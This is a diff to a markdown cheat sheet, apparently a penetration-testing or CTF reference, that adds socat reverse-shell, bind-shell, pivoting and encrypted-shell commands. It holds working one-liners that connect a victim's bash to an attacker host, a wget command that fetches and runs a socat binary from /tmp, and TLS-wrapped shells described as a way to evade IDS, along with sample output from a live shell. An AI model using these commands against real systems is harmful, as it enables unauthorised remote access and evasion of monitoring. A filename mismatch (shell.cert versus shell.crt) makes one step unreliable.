@@ -112,9 +112,13 @@ nc -lvnp 1338
 
 #### Socat <a name='scat'></a>
 ```bash
+# on the attacker machine
+# syntax: socat file:`tty`,raw,echo=0 TCP-L:{port}
+socat file:`tty`,raw,echo=0 TCP-L:1337
+
 # on the victm machine
 # 1.syntax: ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{attacker IP}:{port}
-./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.32:1337
+./socat tcp:<attacker-ip>:<attacker-port> exec:'bash -li',pty,stderr,setsid,sigint,sane 
 
 # 2.syntax: socat tcp-connect:{attacker IP}:{port} exec:"bash -li",pty,stderr,setsid,sigint,sane
 socat tcp-connect:10.10.14.32:1337 exec:"bash -li",pty,stderr,setsid,sigint,sane
@@ -122,9 +126,65 @@ socat tcp-connect:10.10.14.32:1337 exec:"bash -li",pty,stderr,setsid,sigint,sane
 # 3.Oneliner syntax: wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{attacker IP}:{port}
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.32:1337
 
+#============================================================================#
+# simple reverese shell
+# on the compromised machine
+socat TCP-L:<port> EXEC=/bin/bash # execute /bin/bash on conenction
+
 # on the attacker machine
-# syntax: socat file:`tty`,raw,echo=0 TCP-L:{port}
-socat file:`tty`,raw,echo=0 TCP-L:1337
+socat TCP:<compromised-machine-ip>:<opened-port> - 
+
+# 
+
+
+# Pivoting with socat
+# machine we want to access (Machine A)
+socat TCP-L:1234 EXEC:/bin/bash
+
+# machine we have access to (pivot point- Machine B)
+socat TCP-L:3333 TCP:<Machine-A IP>:1234 
+
+# attacker machine  (our machine)
+socat TCP:<Machine-B IP>:3333 - 
+
+# encrypted reverse shells will prevent anyone from spying and used to evade IDS
+
+# On the attacker machine
+## Generate a certificate
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.cert 
+# on creating values will be asked which can be left blank
+# shell.key and shell.cert will be generated
+# merge the key and cert file to generate a pam file
+cat shell.key shell.crt > shell.pem
+# the generated certificate must be used on whichever device is listening for the connection
+socat openssl-listen:4444,cert=shell.pem,verify=0 -
+
+# on the victim machine
+socat openssl-connect:<attacker-ip>:4444,verify=0 EXEC:/bin/bash
+
+# poor interactive shell will be obtained
+
+```bash
+# compromized machine
+┌───[toor@parrot]─[/dev/shm]  
+└──╼ $socat openssl-listen:1234,cert=shell.pem,verify=0 exec:/bin/bash
+```
+
+```bash
+# attackker machine  
+┌────[kali@kali]─[/opt/binaries]
+└──╼ $socat openssl-connect:192.168.43.181:1234,verify=0 -
+id
+uid=1000(toor) gid=1000(toor) groups=1000(toor)
+
+
+# =================================================================================================#
+# fully interactive encrypted shell
+# on the attacker machine
+socat `tty`,raw,echo=0 openssl-listen:1234,cert=shell.pem,verify=0
+
+# on the victim machine
+socat openssl-connect:<attacker-ip>:1234,verify=0 exec:bash,pty,stderr,setsid
 ```
 
 #### Perl <a name='perl'></a>
